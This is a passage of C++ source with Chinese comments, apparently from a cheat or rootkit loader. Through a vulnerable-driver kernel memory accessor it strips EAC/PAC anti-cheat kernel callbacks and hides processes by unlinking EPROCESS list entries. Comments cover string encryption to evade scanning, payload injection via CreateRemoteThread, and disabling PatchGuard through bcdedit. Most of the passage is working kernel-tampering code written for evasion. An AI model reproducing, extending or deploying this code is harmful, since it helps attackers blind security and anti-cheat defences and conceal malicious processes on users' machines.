    m_processCallbacksSaved = (m_savedProcessCallbackCount > 0);
    return removed;
}

int EACCallbackDisabler::DisableImageNotifyCallbacks(const char* eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    char eacSysName[128];
    sprintf_s(eacSysName, "%s.sys", eacDriverName);
    uint64_t eacBase = kma.GetKernelModuleBase(eacSysName);
    if (!eacBase) {
        // BUILD 456: 自体验证
        ByovdDiag("VERIFY:ImageNotify: '%s.sys' not loaded — skip scan (would scan if driver loaded)\n",
            eacDriverName);
        return 0;
    }

    // PsSetLoadImageNotifyRoutine → 找到 PspLoadImageNotifyRoutine 数组
    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 (原明文进入 .rdata)
    char psLoadImgName[64] = {};
    STEALTH_STR_DECRYPT_TO("PsSetLoadImageNotifyRoutine", psLoadImgName, sizeof(psLoadImgName));
    uint64_t psSetLoadImg = kma.ResolveExport(ntBase, psLoadImgName);
    if (!psSetLoadImg) return 0;

    uint8_t funcBody[128] = {};
    if (!kma.ReadKernelVA(psSetLoadImg, funcBody, sizeof(funcBody))) return 0;

    uint64_t arrayAddr = 0;
    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            arrayAddr = psSetLoadImg + i + 7 + disp;
            break;
        }
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0xB9) {
            arrayAddr = *(uint64_t*)(funcBody + i + 2);
            break;
        }
    }

    if (!arrayAddr) return 0;

    // ★ v3.110: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedImageCallbackCount = 0;

    int removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = kma.Read<uint64_t>(arrayAddr + i * 8);
        if (!entry) continue;
        uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL;
        if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
            // ★ v3.110: 保存原始值
            if (m_savedImageCallbackCount < MAX_SAVED_ARRAY_CALLBACKS) {
                SavedArrayEntry& saved = m_savedImageCallbacks[m_savedImageCallbackCount];
                saved.address = arrayAddr + i * 8;
                saved.originalValue = entry;
                m_savedImageCallbackCount++;
            }

            uint64_t zero = 0;
            kma.Write(arrayAddr + i * 8, zero);
            removed++;
        }
    }

    m_imageCallbacksSaved = (m_savedImageCallbackCount > 0);
    return removed;
}

// ★ BUILD 551: DisableThreadNotifyCallbacks — 摘除 PAC 注册的线程创建通知回调
//   基于 PAC_SHV_逆向分析报告 §6 确认 PAC IAT 导入 PsSetCreateThreadNotifyRoutine.
//   实现复用 DisableImageNotifyCallbacks 模式 (PspCreateThreadNotifyRoutine 数组布局相同).
//   数组最大 64 条目 (与 PspCreateProcessNotifyRoutineEx 相同).
int EACCallbackDisabler::DisableThreadNotifyCallbacks(const char* eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    char eacSysName[128];
    sprintf_s(eacSysName, "%s.sys", eacDriverName);
    uint64_t eacBase = kma.GetKernelModuleBase(eacSysName);
    if (!eacBase) {
        ByovdDiag("VERIFY:ThreadNotify: '%s.sys' not loaded — skip scan\n", eacDriverName);
        return 0;
    }

    // PsSetCreateThreadNotifyRoutine → 找到 PspCreateThreadNotifyRoutine 数组
    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 (原明文进入 .rdata)
    char psCreateThreadName[64] = {};
    STEALTH_STR_DECRYPT_TO("PsSetCreateThreadNotifyRoutine", psCreateThreadName, sizeof(psCreateThreadName));
    uint64_t psSetThread = kma.ResolveExport(ntBase, psCreateThreadName);
    if (!psSetThread) return 0;

    // 搜索 lea rcx, [rip+offset] 或 mov rcx, imm64 定位数组 (与 Image/Process 模式相同)
    uint8_t funcBody[128] = {};
    if (!kma.ReadKernelVA(psSetThread, funcBody, sizeof(funcBody))) return 0;

    uint64_t arrayAddr = 0;
    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            arrayAddr = psSetThread + i + 7 + disp;
            break;
        }
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0xB9) {
            arrayAddr = *(uint64_t*)(funcBody + i + 2);
            break;
        }
    }

    if (!arrayAddr) return 0;

    // 重置计数器 (与 Image/Process 模式一致)
    m_savedThreadCallbackCount = 0;

    int removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = kma.Read<uint64_t>(arrayAddr + i * 8);
        if (!entry) continue;
        uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL;
        if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
            if (m_savedThreadCallbackCount < MAX_SAVED_ARRAY_CALLBACKS) {
                SavedArrayEntry& saved = m_savedThreadCallbacks[m_savedThreadCallbackCount];
                saved.address = arrayAddr + i * 8;
                saved.originalValue = entry;
                m_savedThreadCallbackCount++;
            }
            uint64_t zero = 0;
            kma.Write(arrayAddr + i * 8, zero);
            removed++;
        }
    }

    m_threadCallbacksSaved = (m_savedThreadCallbackCount > 0);
    ByovdDiag("BYOVD:DisableThreadNotify: removed %d thread callbacks (array=0x%llX)\n",
        removed, (unsigned long long)arrayAddr);
    return removed;
}

int EACCallbackDisabler::DisableAll(const char* eacDriverName) {
    int total = 0;
    total += DisableObCallbacks(eacDriverName);
    total += DisableProcessNotifyCallbacks(eacDriverName);
    total += DisableImageNotifyCallbacks(eacDriverName);
    // ★ BUILD 551: 摘除线程创建通知回调
    //   原代码注释 "EAC 一般不注册此回调" 是 BUILD 528 时期的错误判断,
    //   逆向确认 PAC (MessageTransfer.sys) IAT 导入 PsSetCreateThreadNotifyRoutine,
    //   必须摘除,否则 loader.exe 注入 payload 时 CreateRemoteThread 会被捕获
    total += DisableThreadNotifyCallbacks(eacDriverName);
    return total;
}

// ★ v3.110: 恢复所有已保存的反作弊回调
int EACCallbackDisabler::RestoreAll() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    int restored = 0;

    // 1. 恢复 ObRegisterCallbacks
    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
    // ★ BUILD 543: 偏移回退到 BUILD 541 (+0x18/+0x28) — 与 DisableObCallbacks 保持一致
    //   BUILD 542 错误: 使用 +0x28/+0x30 偏移 + 链表遍历触发 0x109 蓝屏 (PatchGuard)
    //   虽然 +0x28/+0x30 是 Win11 24H2 真实偏移 (para0x0dise 逆向确认), 但:
    //   (1) MessageTransfer.sys 是 minifilter, 不注册 ObCallbacks, ob=0 是正常的;
    //   (2) 链表遍历 256 条目 × 7 字段 = 1792 次 IOCTL 读取触发 PatchGuard 0x109;
    //   (3) 读取 +0x20=0xFFFFF800C450E740 (ntoskrnl 地址) 可能是 PatchGuard 保护结构.
    //   回退策略: 接受 ob=0 (PAC 不注册 ObCallbacks), 用安全的线性扫描 + 旧偏移避免 PatchGuard.
    for (int i = 0; i < m_savedObCallbackCount; i++) {
        SavedObEntry& saved = m_savedObCallbacks[i];
        if (kma.IsKernelAddressValid(saved.address)) {
            kma.Write(saved.address + 0x18, saved.preOp);  // PreOperation  (+0x18)
            kma.Write(saved.address + 0x28, saved.postOp); // PostOperation (+0x28)
            restored++;
        }
    }
    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedObCallbackCount = 0;
    m_obCallbacksSaved = false;

    // 2. 恢复进程通知回调
    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
    for (int i = 0; i < m_savedProcessCallbackCount; i++) {
        SavedArrayEntry& saved = m_savedProcessCallbacks[i];
        if (kma.IsKernelAddressValid(saved.address)) {
            kma.Write(saved.address, saved.originalValue);
            restored++;
        }
    }
    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedProcessCallbackCount = 0;
    m_processCallbacksSaved = false;

    // 3. 恢复模块加载通知回调
    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
    for (int i = 0; i < m_savedImageCallbackCount; i++) {
        SavedArrayEntry& saved = m_savedImageCallbacks[i];
        if (kma.IsKernelAddressValid(saved.address)) {
            kma.Write(saved.address, saved.originalValue);
            restored++;
        }
    }
    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedImageCallbackCount = 0;
    m_imageCallbacksSaved = false;

    // ★ BUILD 551: 4. 恢复线程创建通知回调
    for (int i = 0; i < m_savedThreadCallbackCount; i++) {
        SavedArrayEntry& saved = m_savedThreadCallbacks[i];
        if (kma.IsKernelAddressValid(saved.address)) {
            kma.Write(saved.address, saved.originalValue);
            restored++;
        }
    }
    m_savedThreadCallbackCount = 0;
    m_threadCallbacksSaved = false;

    ByovdDiag("BYOVD:EACCallbackDisabler: restored %d callbacks\n", restored);
    return restored;
}

// ★ BUILD 528: E+G — 重新移除 PAC ObCallbacks (内部处理名称解析)
//   供 payload.cpp 主循环周期性调用, 对抗 PAC 重新注册回调.
//   不使用 std::string — 固定缓冲区, manual-mapped DLL 安全.
// ★ 前向声明: GetPacTargetName 和 WStringToString 在本文件后面定义 (static)
// ★ BUILD 563: GetPacTargetName → FillPacTargetName (栈缓冲, 消除 .data 段长明文)
static void FillPacTargetName(wchar_t* buf, size_t bufChars);
static int WStringToString(const wchar_t* ws, char* outBuf, int outBufSize);
int EACCallbackDisabler::ReDisablePacCallbacks() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    // 内部调用 GetPacTargetName() + WStringToString() + DisableObCallbacks()
    // 这两个函数是 static, 但本方法在同类同文件中, 可直接访问
    // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), 用完 SecureZeroMemory 清零
    char pacNameA[256] = {};
    {
        wchar_t pacNameW[256] = {};
        FillPacTargetName(pacNameW, 256);
        WStringToString(pacNameW, pacNameA, 256);
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
    }
    if (pacNameA[0] == 0) {
        ByovdDiag("E+G:ReDisablePacCallbacks: tgt-name empty, skip\n");
        SecureZeroMemory(pacNameA, sizeof(pacNameA));  // ★ BUILD 563: 失败路径也清零
        return 0;
    }
    int removed = DisableObCallbacks(pacNameA);
    ByovdDiag("E+G:ReDisablePacCallbacks: re-removed %d callbacks (name=%s)\n",
        removed, pacNameA);
    SecureZeroMemory(pacNameA, sizeof(pacNameA));  // ★ BUILD 563: 用完清零
    return removed;
}

// ============================================================
// 内核导出表解析
// ============================================================

uint64_t KernelMemoryAccessor::ResolveExport(uint64_t moduleBase, const char* funcName) {
    if (!moduleBase || !m_active) return 0;

    // 读取 PE 头的 DOS 头
    IMAGE_DOS_HEADER dos = {};
    if (!ReadKernelVA(moduleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // 读取 NT 头
    uint64_t ntHdrVA = moduleBase + dos.e_lfanew;
    IMAGE_NT_HEADERS64 nt = {};
    if (!ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    // 导出目录
    auto& expDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.VirtualAddress || !expDir.Size) return 0;

    uint64_t expVA = moduleBase + expDir.VirtualAddress;
    IMAGE_EXPORT_DIRECTORY ied = {};
    if (!ReadKernelVA(expVA, &ied, sizeof(ied))) return 0;

    // ★ v3.118: 使用 VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
    uint32_t* nameRVAs = nullptr;
    uint32_t* funcRVAs = nullptr;
    uint16_t* ordinals = nullptr;
    uint64_t result = 0;

    nameRVAs = (uint32_t*)VirtualAlloc(nullptr, ied.NumberOfNames * sizeof(uint32_t),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    funcRVAs = (uint32_t*)VirtualAlloc(nullptr, ied.NumberOfFunctions * sizeof(uint32_t),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ordinals = (uint16_t*)VirtualAlloc(nullptr, ied.NumberOfNames * sizeof(uint16_t),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!nameRVAs || !funcRVAs || !ordinals) {
        ByovdDiag("BYOVD:ResolveExport: VirtualAlloc FAILED\n");
        goto cleanup;
    }

    if (!ReadKernelVA(moduleBase + ied.AddressOfNames, nameRVAs,
                       ied.NumberOfNames * sizeof(uint32_t))) goto cleanup;
    if (!ReadKernelVA(moduleBase + ied.AddressOfFunctions, funcRVAs,
                       ied.NumberOfFunctions * sizeof(uint32_t))) goto cleanup;
    if (!ReadKernelVA(moduleBase + ied.AddressOfNameOrdinals, ordinals,
                       ied.NumberOfNames * sizeof(uint16_t))) goto cleanup;

    // 线性搜索导出名
    for (DWORD i = 0; i < ied.NumberOfNames; i++) {
        char name[128] = {};
        ReadKernelVA(moduleBase + nameRVAs[i], name, sizeof(name) - 1);
        if (strcmp(name, funcName) == 0) {
            uint32_t rva = funcRVAs[ordinals[i]];
            result = moduleBase + rva;
            break;
        }
    }

cleanup:
    if (nameRVAs) VirtualFree(nameRVAs, 0, MEM_RELEASE);
    if (funcRVAs) VirtualFree(funcRVAs, 0, MEM_RELEASE);
    if (ordinals) VirtualFree(ordinals, 0, MEM_RELEASE);
    return result;
}

// ============================================================
// DKOMProcessHider — EPROCESS ActiveProcessLinks 断链
//
// ★ BUILD 537 (Gamma-A): PatchGuard 已通过 bcdedit /debug on 禁用
//   内核调试模式启动时 PG 设计上不初始化, DKOM 可永久断链
//   无需 Unhide/Rehide 周期缓解, 无 BSOD 风险 (3小时内 0%)
//
// 前置条件: 已运行 enable_gamma_a.bat + 重启系统
// 验证方法: bcdedit /enum {current} 显示 debug=Yes
// ============================================================

DKOMProcessHider& DKOMProcessHider::Instance() {
    static DKOMProcessHider inst;
    return inst;
}

// ============================================================
// ★ BUILD 544: 向后兼容 API — 转发到多 PID 实现
// ============================================================
bool DKOMProcessHider::HideProcess() {
    return HideProcessByPid(GetCurrentProcessId());
}

bool DKOMProcessHider::UnhideProcess() {
    return UnhideProcessByPid(GetCurrentProcessId());
}

uint64_t DKOMProcessHider::GetCurrentEPROCESS() const {
    // 查找 loader2 (当前进程) 在 m_hiddenList 中的 EPROCESS
    DWORD currentPid = GetCurrentProcessId();
    for (size_t i = 0; i < MAX_HIDDEN; i++) {
        if (m_hiddenList[i].hidden && m_hiddenList[i].pid == currentPid) {
            return m_hiddenList[i].eprocess;
        }
    }
    return 0;
}

// ============================================================
// ★ BUILD 544: EnsureOffsetsResolved — 动态扫描 EPROCESS 偏移
//   原理: System EPROCESS (PID=4) 的 UniqueProcessId 字段值为 4
//   扫描 0x100-0x800 范围, 找到值为 4 的字段, 验证其后 8 字节为内核地址 (ActiveProcessLinks.Flink)
//   二次验证: 通过 Flink 遍历到下一个 EPROCESS, 读取其 PID (应 > 0 且 < 100000)
//   适配所有 Windows 版本 (Win10/11/24H2/25H2), 不依赖硬编码偏移
// ============================================================
bool DKOMProcessHider::EnsureOffsetsResolved(KernelMemoryAccessor& kma, uint64_t ntBase) {
    if (m_pidOffset != 0 && m_linksOffset != 0) {
        StateLog("PVP", "EO_Cached", "pidOff=0x%X linksOff=0x%X", m_pidOffset, m_linksOffset);
        return true;
    }

    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 PsInitialSystemProcess (原明文进入 .rdata)
    char psInitProcName[40] = {};
    STEALTH_STR_DECRYPT_TO("PsInitialSystemProcess", psInitProcName, sizeof(psInitProcName));
    StateLog("PVP", "EO_PreResolve", "ntBase=0x%llX", (unsigned long long)ntBase);
    uint64_t psInitProcVA = kma.ResolveExport(ntBase, psInitProcName);
    if (!psInitProcVA) {
        StateLog("PVP", "EO_Fail", "step=ResolveExport ntBase=0x%llX", (unsigned long long)ntBase);
        return false;
    }

    StateLog("PVP", "EO_PreReadSys", "psInitProcVA=0x%llX", (unsigned long long)psInitProcVA);
    uint64_t systemEPROCESS = kma.Read<uint64_t>(psInitProcVA);
    if (!systemEPROCESS) {
        StateLog("PVP", "EO_Fail", "step=ReadSysEPROC psInitProcVA=0x%llX", (unsigned long long)psInitProcVA);
        return false;
    }

    StateLog("PVP", "EO_ScanStart", "sysEPROC=0x%llX range=0x100-0x800", (unsigned long long)systemEPROCESS);

    for (uint32_t off = 0x100; off < 0x800; off += 8) {
        // ★ BUILD 567 v3.235: 使用 ReadUnsafe (systemEPROCESS 可能在非分页池扩展区域)
        uint64_t val = kma.ReadUnsafe<uint64_t>(systemEPROCESS + off);
        if (val != 4) continue;

        // 候选 UniqueProcessId 偏移 = off
        // 验证 off+8 (Flink) 和 off+16 (Blink) 是否为内核地址
        uint64_t flink = kma.ReadUnsafe<uint64_t>(systemEPROCESS + off + 8);
        uint64_t blink = kma.ReadUnsafe<uint64_t>(systemEPROCESS + off + 16);
        if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

        // 二次验证: 通过 Flink 遍历到下一个 EPROCESS, 读取其 PID
        uint64_t nextEPROC = flink - (off + 8);
        uint64_t nextPid = kma.ReadUnsafe<uint64_t>(nextEPROC + off);
        if (nextPid == 0 || nextPid >= 100000) continue;

        // 验证通过
        m_pidOffset = off;
        m_linksOffset = off + 8;
        StateLog("PVP", "EO_OK", "pidOff=0x%X linksOff=0x%X nextPid=%llu",
            m_pidOffset, m_linksOffset, (unsigned long long)nextPid);
        return true;
    }

    StateLog("PVP", "EO_Fail", "step=scan no PID=4 field in 0x100-0x800");
    return false;
}

// ============================================================
// ★ BUILD 544: FindEPROCESSByPid — 通过 PID 查找 EPROCESS
//   从 PsInitialSystemProcess (System, PID=4) 开始遍历 ActiveProcessLinks
//   ★ System PID==4 断言 (iter==1 时检测偏移错误)
// ============================================================
uint64_t DKOMProcessHider::FindEPROCESSByPid(KernelMemoryAccessor& kma, DWORD pid) {
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) {
        StateLog("PVP", "FE_Fail", "step=ntBase");
        return 0;
    }

    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 PsInitialSystemProcess
    char psInitProcName2[40] = {};
    STEALTH_STR_DECRYPT_TO("PsInitialSystemProcess", psInitProcName2, sizeof(psInitProcName2));
    uint64_t psInitProcVA = kma.ResolveExport(ntBase, psInitProcName2);
    if (!psInitProcVA) {
        StateLog("PVP", "FE_Fail", "step=ResolveExport ntBase=0x%llX", (unsigned long long)ntBase);
        return 0;
    }

    uint64_t systemEPROCESS = kma.Read<uint64_t>(psInitProcVA);
    if (!systemEPROCESS) {
        StateLog("PVP", "FE_Fail", "step=ReadSysEPROC");
        return 0;
    }

    StateLog("PVP", "FE_Start", "pid=%u sysEPROC=0x%llX pidOff=0x%X", pid, (unsigned long long)systemEPROCESS, m_pidOffset);
    uint64_t current = systemEPROCESS;
    uint64_t start   = current;
    DWORD iter = 0;
    const DWORD maxIter = 1024;  // 防御性上限, 防止链表损坏导致无限循环

    do {
        iter++;
        if (iter > maxIter) {
            StateLog("PVP", "FE_Fail", "step=maxIter pid=%u iter=%u", pid, maxIter);
            return 0;
        }

        uint64_t currentPid = kma.ReadUnsafe<uint64_t>(current + m_pidOffset);

        // ★ System PID==4 断言 — iter==1 时 current==systemEPROCESS, PID 必须为 4
        if (iter == 1 && currentPid != 4) {
            ByovdDiag("DKOM.FindByPid: FAIL System PID assertion failed (iter=1 pid@+0x%X=%llu, "
                      "expected 4 — offset wrong)\n", m_pidOffset, (unsigned long long)currentPid);
            return 0;
        }

        if ((DWORD)currentPid == pid) {
            StateLog("PVP", "FE_OK", "pid=%u EPROC=0x%llX iter=%u", pid, (unsigned long long)current, iter);
            return current;
        }

        // 移动到下一个 EPROCESS
        uint64_t flink = kma.ReadUnsafe<uint64_t>(current + m_linksOffset);
        if (!flink || flink < 0xFFFF800000000000ULL) {
            StateLog("PVP", "FE_Fail", "step=chainBroken iter=%u flink=0x%llX pid=%u",
                iter, (unsigned long long)flink, pid);
            return 0;  // 直接返回, 不 break 避免误导性 "not found" 日志
        }

        current = flink - m_linksOffset; // Flink 指向 ActiveProcessLinks, 需要减去偏移回 EPROCESS
    } while (current != start);

    StateLog("PVP", "FE_Fail", "step=notFound pid=%u iter=%u (cycle back to start)", pid, iter);
    return 0;
}

// ============================================================
// ★ BUILD 544: FindOrAllocSlot — 在 m_hiddenList 中查找或分配槽位
// ============================================================
DKOMProcessHider::HiddenEntry* DKOMProcessHider::FindOrAllocSlot(DWORD pid) {
    // 先查找已存在的条目 (重复隐藏同一 PID 时复用)
    for (size_t i = 0; i < MAX_HIDDEN; i++) {
        if (m_hiddenList[i].hidden && m_hiddenList[i].pid == pid) {
            return &m_hiddenList[i];
        }
    }
    // 分配空槽 (eprocess==0 或 hidden==false)
    for (size_t i = 0; i < MAX_HIDDEN; i++) {
        if (!m_hiddenList[i].hidden) {
            // 清空字段
            m_hiddenList[i].eprocess    = 0;
            m_hiddenList[i].flinkBackup = 0;
            m_hiddenList[i].blinkBackup = 0;
            m_hiddenList[i].pid         = pid;
            m_hiddenList[i].hidden      = false;
            return &m_hiddenList[i];
        }
    }
    return nullptr;  // 槽位已满
}

// ============================================================
// ★ BUILD 544: PerformUnlink — 执行 DKOM 断链
//   写 next.Blink=prev (先写, 失败安全) → prev.Flink=next (后写, 成功后 current 被跳过)
//   备份 flink/blink 到 entry (供 UnhideProcessByPid 检查链表完整性)
// ============================================================
bool DKOMProcessHider::PerformUnlink(KernelMemoryAccessor& kma, HiddenEntry* entry,
                                      DWORD pid, uint64_t eproc) {
    // 读取 Flink / Blink (ActiveProcessLinks 在 m_linksOffset)
    // ★ BUILD 537: 紧凑读-改-写, 中间不插入任何阻塞 I/O (避免 TOCTOU 竞态)
    // ★ BUILD 567 v3.235: 使用 ReadUnsafe (EPROCESS 可能在非分页池扩展区域)
    uint64_t flink = kma.ReadUnsafe<uint64_t>(eproc + m_linksOffset);
    uint64_t blink = kma.ReadUnsafe<uint64_t>(eproc + m_linksOffset + 8);

    if (!flink || !blink) {
        ByovdDiag("DKOM.PerformUnlink: FAIL flink/blink is NULL (pid=%u EPROC=0x%llX flink=0x%llX blink=0x%llX)\n",
            pid, (unsigned long long)eproc, (unsigned long long)flink, (unsigned long long)blink);
        return false;
    }
    if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) {
        ByovdDiag("DKOM.PerformUnlink: FAIL flink/blink not in kernel range (pid=%u flink=0x%llX blink=0x%llX)\n",
            pid, (unsigned long long)flink, (unsigned long long)blink);
        return false;
    }

    // 备份到 entry (供 UnhideProcessByPid 链表一致性检查)
    entry->eprocess    = eproc;
    entry->flinkBackup = flink;
    entry->blinkBackup = blink;

    // ★ BUILD 497/537: 修复 DKOM 断链 — 写入邻居节点的 LIST_ENTRY, 而非自己的
    //   blink 是前一个节点 ActiveProcessLinks 的地址 → blink 处即 prev.Flink
    //   flink 是后一个节点 ActiveProcessLinks 的地址 → flink+8 处即 next.Blink
    //   跳过当前节点: prev.Flink = next, next.Blink = prev
    //
    // ★ BUILD 537: 失败安全写入顺序 — 先 next.Blink, 后 prev.Flink
    //   若 w2 失败: 链表未变, current 仍在链表, 无 BSOD
    //   若 w2 成功 w1 失败: next.Blink→prev, 但 prev.Flink→current 仍可达,
    //                       current 未被跳过, 内核遍历正常, 无 BSOD
    //   两写均成功: current 被完全跳过, DKOM 成功
    //   (反向顺序 w1 先写会留下 next.Blink→current 的悬挂指针, 内核遍历必 BSOD)
    // ★ BUILD 567 v3.235: 使用 WriteUnsafe (EPROCESS 可能在非分页池扩展区域)
    bool w2 = kma.WriteUnsafe(flink + 8, blink);  // next.Blink = prev (先写, 失败安全)
    bool w1 = kma.WriteUnsafe(blink, flink);      // prev.Flink = next (后写, 成功后 current 被跳过)

    if (!w1 || !w2) {
        // 链表可能部分破坏, 但写入顺序保证不 BSOD;
        // 不置 entry->hidden=true, 避免 UnhideProcessByPid 错误触发
        ByovdDiag("DKOM.PerformUnlink: FAIL w1(prev.Flink)=%d w2(next.Blink)=%d (pid=%u "
                  "blink=0x%llX flink=0x%llX) — abort, hidden NOT set\n",
            w1?1:0, w2?1:0, pid, (unsigned long long)blink, (unsigned long long)flink);
        // 清空 entry, 释放槽位
        entry->eprocess    = 0;
        entry->flinkBackup = 0;
        entry->blinkBackup = 0;
        return false;
    }

    // ★ BUILD 537: FOUND 日志在 Write 之后 (防 TOCTOU 竞态)
    ByovdDiag("DKOM.PerformUnlink: SUCCESS pid=%u EPROC=0x%llX flink=0x%llX blink=0x%llX\n",
        pid, (unsigned long long)eproc, (unsigned long long)flink, (unsigned long long)blink);
    return true;
}

// ============================================================
// ★ BUILD 544: SelfLoopHarden — 自循环加固
//   写 current.Flink=&current, current.Blink=&current
//   防止非当前进程 (basic.exe) 被外部 TerminateProcess 时:
//     PspExitProcess → RemoveEntryList(&current->ActiveProcessLinks)
//     检查 current->Blink->Flink == &current ✓ (self-loop)
//     检查 current->Flink->Blink == &current ✓ (self-loop)
//   不触发 0x139 蓝屏
//
//   注意: current 已经被 PerformUnlink 从链表中跳过 (prev->Flink=next, next->Blink=prev)
//   所以修改 current 自身的 Flink/Blink 不影响链表其他节点
// ============================================================
bool DKOMProcessHider::SelfLoopHarden(KernelMemoryAccessor& kma, HiddenEntry* entry) {
    uint64_t currentLinksVA = entry->eprocess + m_linksOffset;

    // ★ BUILD 567 v3.235: 使用 WriteUnsafe (EPROCESS 可能在非分页池扩展区域 0xFFFF8000-0xFFFFF680,
    //   白名单 [0xFFFFF680, 0xFFFFFD00) 拒绝写入, 导致 SelfLoopHarden 失败 → 0x139 蓝屏风险)
    bool w1 = kma.WriteUnsafe(currentLinksVA,     currentLinksVA);  // current.Flink = &current (self-loop)
    bool w2 = kma.WriteUnsafe(currentLinksVA + 8, currentLinksVA);  // current.Blink = &current (self-loop)

    if (!w1 || !w2) {
        ByovdDiag("DKOM.SelfLoopHarden: FAIL w1(Flink)=%d w2(Blink)=%d (pid=%u currentLinks=0x%llX) "
                  "— non-current process may BSOD on external TerminateProcess\n",
            w1?1:0, w2?1:0, entry->pid, (unsigned long long)currentLinksVA);
        return false;
    }

    ByovdDiag("DKOM.SelfLoopHarden: OK pid=%u currentLinks=0x%llX (self-loop written)\n",
        entry->pid, (unsigned long long)currentLinksVA);
    return true;
}

// ============================================================
// ★ BUILD 544: HideProcessByPid — 隐藏指定 PID 的进程
// ============================================================
bool DKOMProcessHider::HideProcessByPid(DWORD pid) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("DKOM.HideByPid: FAIL kma not active (pid=%u)\n", pid);
        return false;
    }

    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) {
        ByovdDiag("DKOM.HideByPid: FAIL ntBase=0 (pid=%u)\n", pid);
        return false;
    }

    // 1. 解析偏移 (复用缓存)
    if (!EnsureOffsetsResolved(kma, ntBase)) {
        ByovdDiag("DKOM.HideByPid: FAIL offsets not resolved (pid=%u)\n", pid);
        return false;
    }

    ByovdDiag("DKOM.HideByPid: start pid=%u ntBase=0x%llX pidOffset=0x%X linksOffset=0x%X\n",
        pid, (unsigned long long)ntBase, m_pidOffset, m_linksOffset);

    // 2. 查找 EPROCESS
    uint64_t eproc = FindEPROCESSByPid(kma, pid);
    if (!eproc) {
        ByovdDiag("DKOM.HideByPid: FAIL pid=%u not found (may be already hidden)\n", pid);
        return false;
    }

    // 3. 分配槽位
    HiddenEntry* entry = FindOrAllocSlot(pid);
    if (!entry) {
        ByovdDiag("DKOM.HideByPid: FAIL no free slot (max %d hidden, pid=%u)\n",
            (int)MAX_HIDDEN, pid);
        return false;
    }

    // 已隐藏则直接返回 (避免重复断链)
    if (entry->hidden) {
        ByovdDiag("DKOM.HideByPid: pid=%u already hidden (EPROC=0x%llX)\n",
            pid, (unsigned long long)entry->eprocess);
        return true;
    }

    // 4. 执行断链
    if (!PerformUnlink(kma, entry, pid, eproc)) {
        return false;
    }

    // 5. 自循环加固 (所有进程, 包括当前进程)
    //   ★ BUILD 558 FIX: 当前进程也必须自循环 (7/18-7/19 三次 0x139 param 3 蓝屏根因)
    //     根因: PerformUnlink 后 current.Flink/Blink 保留原值 (指向 prev/next),
    //           但 prev.Flink=next, next.Blink=prev (current 被跳过).
    //           进程崩溃退出时 PspExitProcess 调用 RemoveEntryList 检查:
    //             current.Flink->Blink == current → next.Blink == current → FALSE
    //           → BugCheck 0x139 param 3 (LIST_ENTRY corruption)
    //     修复: current.Flink=&current, current.Blink=&current (自循环)
    //           RemoveEntryList 检查: (&current)->Blink == current → current == current ✓
    //     注意: SelfLoopHarden 不影响 UnhideAll 的 listIntact 检查
    //           (listIntact 检查 prev.Flink/next.Blink, 不检查 current.Flink/Blink)
    //           但 UnhideAll listIntact=true 路径必须额外恢复 current.Flink/Blink
    //           (见 UnhideProcessByPid 的 BUILD 558 FIX)
    //     历史记录: 7/18 21:42, 22:40, 7/19 16:43 三次 0x139 param 3 蓝屏
    if (!SelfLoopHarden(kma, entry)) {
        // ★ BUILD 558 FIX: SelfLoopHarden 失败 — 必须回滚 PerformUnlink, 恢复链表完整性
        //   不设置 hidden=true, 避免 UnhideAll 误操作孤立节点
        //   回滚: 写 next.Blink=&current, prev.Flink=&current (恢复 current 在链表中)
